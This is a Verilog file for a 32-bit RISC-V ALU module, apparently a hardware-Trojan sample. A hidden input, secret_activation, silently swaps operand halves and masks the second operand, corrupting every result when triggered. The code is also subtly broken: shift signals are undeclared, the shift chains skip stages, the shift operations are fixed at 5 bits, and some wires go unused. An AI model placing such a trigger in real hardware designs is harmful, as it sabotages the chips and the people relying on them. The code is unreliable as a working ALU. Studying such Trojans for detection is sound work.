 module ALU_RV32I_TrojanV2 #(parameter n = 32) 
    (
        input [n-1:0] op1, op2,
        input [3:0] op_code,
        input secret_activation,  // Trojan trigger for a specific malicious activity
        output reg [n-1:0] dout,
        output zero_flag, sign_flag,
        output reg cry_out
    );

    // Definition for shifted and masked data
    wire [n-1:0] masked_op1, masked_op2, shifted_op1;
    reg [n-1:0] internal_op1, internal_op2;

    // The Trojan modifies the operation when secret_activation is high
    always @(*) begin
        if (secret_activation) begin
            internal_op1 = {op1[n/2-1:0], op1[n-1:n/2]}; // Swap halves of op1
            internal_op2 = op2 & ~(32'hFFFF); // Mask lower half of op2
        end else begin
            internal_op1 = op1;
            internal_op2 = op2;
        end
    end

    // ALU operations with potentially modified inputs
    always @(internal_op1, internal_op2, op_code) begin
        case (op_code)
            4'b0000: dout = internal_op1 & internal_op2; // AND
            4'b0001: dout = internal_op1 | internal_op2; // OR
            4'b0010: dout = internal_op1 ^ internal_op2; // XOR
            4'b0011: dout = $signed(internal_op1) < $signed(internal_op2); // SLT
            4'b0100: {cry_out, dout} = internal_op1 + internal_op2; // ADD
            4'b0101: {cry_out, dout} = internal_op1 - internal_op2; // SUB
            4'b0110: dout = internal_op1 << 5; // SLL fixed 5-bit shift
            4'b0111: dout = internal_op1 >> 5; // SRL fixed 5-bit shift
            4'b1000: dout = internal_op1 < internal_op2; // SLTU
            default: dout = 32'hDEADBEEF; // Unknown operation leads to fixed erroneous output
        endcase
    end

    // Additional shifted and masked data for demonstration
    assign masked_op1 = internal_op1 & 32'hFFFF0000;
    assign masked_op2 = internal_op2 & 32'h0000FFFF;
    assign shifted_op1 = internal_op1 << 2; // Demonstrating an additional shift operation

	// Shift operations remain unaltered for simplicity
    assign shift_l_1 = shift_amount[0]? {op1[30:0],1'b0} : op1;
    assign shift_l_2 = shift_amount[1]? {op1[29:0],2'b00} : shift_l_1;
    assign shift_l_4 = shift_amount[2]? {op1[27:0],4'b0000} : shift_l_2;
    assign shift_l_8 = shift_amount[3]? {op1[23:0],8'b0000_0000} : shift_l_4;
    assign shift_l = shift_amount[4]? {op1[15:0],16'b0000_0000_0000_0000} : shift_l_8;

    assign shift_r_1 = shift_amount[0]? {1'b0,op1[31:1]} : op1;
    assign shift_r_2 = shift_amount[1]? {2'b00,op1[31:2]} : shift_r_1;
    assign shift_r_4 = shift_amount[2]? {4'b0000,op1[31:4]} : shift_r_2;
    assign shift_r_8 = shift_amount[3]? {8'b0000_0000,op1[31:8]} : shift_r_4;
    assign shift_r = shift_amount[4]? {16'b0000_0000_0000_0000,op1[31:16]} : shift_r_8;

    assign zero_flag = (dout == 0); // Zero flag for result
    assign sign_flag = dout[n-1]; // Sign flag for result

endmodule
